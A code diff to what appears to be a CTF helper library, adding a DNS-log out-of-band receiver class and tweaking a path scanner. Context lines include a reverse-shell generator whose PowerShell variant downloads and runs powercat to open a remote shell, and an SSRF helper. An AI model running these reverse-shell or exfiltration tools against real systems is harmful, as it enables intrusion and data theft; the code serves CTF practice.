@@ -1,4 +1,3 @@
-from re import match
 from enum import Enum
 from functools import partial
 from hashlib import md5 as _md5
@@ -10,11 +9,15 @@ from itertools import chain
 from json import loads
 from math import ceil
 from os import path
+from queue import Queue
+from re import match
 from threading import Thread
+from time import time
 from typing import Dict, List, Tuple, Union
 from urllib.parse import quote, quote_plus, urljoin
 
 import requests
+import socketio
 from ctfbox.exceptions import (FlaskSessionHelperError, GeneratePayloadError,
                                HashAuthArgumentError, HttprawError,
                                ProvideArgumentError, ScanError)
@@ -684,7 +687,7 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         return s
 
 
-def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, timeout: int = 60, threadNum: int = 25,) -> list:
+def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, timeout: int = 60, threadNum: int = 10) -> list:
     """Scan for find existing network path
 
     Args:
@@ -693,7 +696,7 @@ def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, t
         filepath (str, optional): the dictionary file path, it will be preferred. Defaults to "".
         show (bool, optional): whether print result. Defaults to True.
         timeout (int, optional): request timeout. Defaults to 60.
-        threadNum (int, optional): thread number. Defaults to 25.
+        threadNum (int, optional): thread number. Defaults to 10.
 
     Raises:
         ScanError
@@ -786,3 +789,73 @@ def reshell(ip: str, port: Union[str, int], tp: str = "bash") -> str:
     elif (tp == "ps" or tp == "powershell"):
         command = """powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd'""" % (ip, port)
     return command
+
+
+class OOB():
+    """An auxiliary class for oob, You can iterate it directly to get the data.
+
+    Args:
+        debug (bool, optional): whether debug mode is enabled
+
+    Returns:
+        iterator: An iterator that can be used to get data
+
+    Note:
+        power by socket.io and dnslog.io
+
+    Example:
+        oob = OOB()
+        for data in oob:
+            print(data)
+
+    """
+    def __init__(self, debug=False):
+        sio = socketio.Client()
+        self.sio = sio
+        self._queue = Queue()
+        self.debug = debug
+        self._unique = []
+        self._updateTime = time()
+
+        @sio.on("randomDomain")
+        def randomDomain(data):
+            domain = data["domain"]
+            print('DnsLog domain:', domain)
+            self.domain = domain
+
+        @sio.on("dnslog")
+        def dnslog(data):
+            current_time = time()
+            if current_time - self._updateTime > 3.0:
+                del self._unique
+                self._unique = []
+                self._updateTime = current_time
+            message = data["dnslog"]
+            message = message.split(".")[0]
+            if message not in self._unique:
+                self._unique.append(message)
+                self._queue.put(message)
+
+        @sio.event
+        def connect():
+            if self.debug:
+                print("DnsLogClient connected")
+
+        @sio.event
+        def connect_error(data):
+            if self.debug:
+                print("DnsLogClient connection failed!")
+
+        @sio.event
+        def disconnect():
+            if self.debug:
+                print("DnsLogClient disconnect")
+
+        sio.connect("https://dnslog.io/")
+
+    def __iter__(self):
+        return self
+
+    def __next__(self):
+        data = self._queue.get()
+        return data
